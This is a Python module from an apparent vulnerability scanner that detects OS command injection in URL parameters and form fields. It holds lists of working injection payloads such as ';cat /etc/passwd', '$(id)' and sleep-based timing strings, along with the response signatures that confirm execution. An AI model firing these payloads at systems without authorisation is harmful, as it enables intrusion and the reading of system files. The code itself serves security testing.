"""
RCE / Command Injection scanner.
Detects OS command injection via error patterns, timing, and output signatures.
"""
from __future__ import annotations

import asyncio
import time as time_mod
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode

import aiohttp

from scanner.utils import http as http_util

# Payload, expected_output_signature (None = use timing/error detection)
ERROR_PAYLOADS: List[str] = [
    ";id",
    "&&id",
    "|id",
    "||id",
    "`id`",
    "$(id)",
    ";id;",
    "; echo VULNSCAN_RCE_$(id)",
    "& echo VULNSCAN_RCE_%USERNAME%",        # Windows
    "| type C:\\windows\\win.ini",            # Windows
    ";cat /etc/passwd",
    "|cat /etc/passwd",
    "&&cat /etc/passwd",
    ";ls -la",
    "&&ls",
    "|ls",
    "'; echo VULNSCAN_RCE;'",
    '"; echo VULNSCAN_RCE;"',
]

TIME_PAYLOADS: List[tuple] = [
    ("; sleep 4",               4),
    ("&& sleep 4",              4),
    ("| sleep 4",               4),
    ("; ping -c 4 127.0.0.1",   4),
    ("; timeout /t 4",          4),  # Windows
    ("$(sleep 4)",              4),
    ("`sleep 4`",               4),
]

RCE_SIGNATURES = [
    "uid=",        # id output
    "gid=",
    "groups=",
    "root:x:",     # /etc/passwd
    "VULNSCAN_RCE",
    "win.ini",
    "[fonts]",
    "[extensions]",
]

CMD_PARAM_NAMES = {"cmd", "exec", "command", "run", "ping", "query",
                   "input", "code", "payload", "arg", "args", "pass"}


async def scan(session: aiohttp.ClientSession, url: str, forms=None) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    parsed = urlparse(url)

    if parsed.query:
        params = parse_qs(parsed.query, keep_blank_values=True)
        for param in params:
            finding = await _test_param(session, url, parsed, params, param)
            if finding:
                findings.append(finding)

    for (form_url, method, fields) in (forms or []):
        for field in fields:
            finding = await _test_form(session, form_url, method, fields, field)
            if finding:
                findings.append(finding)

    return findings


async def _test_param(session, url, parsed, params, param) -> Optional[Dict]:
    # Error / output based
    for payload in ERROR_PAYLOADS:
        tp = {k: v[0] for k, v in params.items()}
        tp[param] = tp[param] + payload
        test_url = parsed._replace(query=urlencode(tp)).geturl()
        resp = await http_util.get(session, test_url, timeout=12)
        if resp is None:
            continue
        try:
            text = await resp.text(errors="ignore")
        except Exception:
            continue
        if any(sig in text for sig in RCE_SIGNATURES):
            return _make(url, param, payload, "output-based", text[:300])

    # Time based
    for payload, wait in TIME_PAYLOADS:
        tp = {k: v[0] for k, v in params.items()}
        tp[param] = tp[param] + payload
        test_url = parsed._replace(query=urlencode(tp)).geturl()
        t0 = time_mod.monotonic()
        try:
            resp = await asyncio.wait_for(
                session.get(test_url, ssl=False), timeout=wait + 6
            )
            if resp:
                await resp.text(errors="ignore")
        except asyncio.TimeoutError:
            return _make(url, param, payload, "time-based", f"Response delayed >{wait}s")
        except Exception:
            continue
        elapsed = time_mod.monotonic() - t0
        if elapsed >= wait:
            return _make(url, param, payload, "time-based", f"Response took {elapsed:.1f}s")

    return None


async def _test_form(session, form_url, method, fields, field) -> Optional[Dict]:
    for payload in ERROR_PAYLOADS[:6]:
        data = dict(fields)
        data[field] = data.get(field, "") + payload
        if method == "post":
            resp = await http_util.post(session, form_url, data=data, timeout=12)
        else:
            resp = await http_util.get(session, form_url, params=data, timeout=12)
        if resp is None:
            continue
        try:
            text = await resp.text(errors="ignore")
        except Exception:
            continue
        if any(sig in text for sig in RCE_SIGNATURES):
            return _make(form_url, field, payload, "form/output-based", text[:300])
    return None


def _make(url, param, payload, context, evidence) -> Dict[str, Any]:
    return {
        "type":      "rce",
        "severity":  "critical",
        "url":       url,
        "parameter": param,
        "payload":   payload,
        "context":   context,
        "evidence":  evidence,
        "details":   f"Remote Code Execution ({context})",
        "timestamp": time_mod.strftime("%Y-%m-%dT%H:%M:%S"),
    }
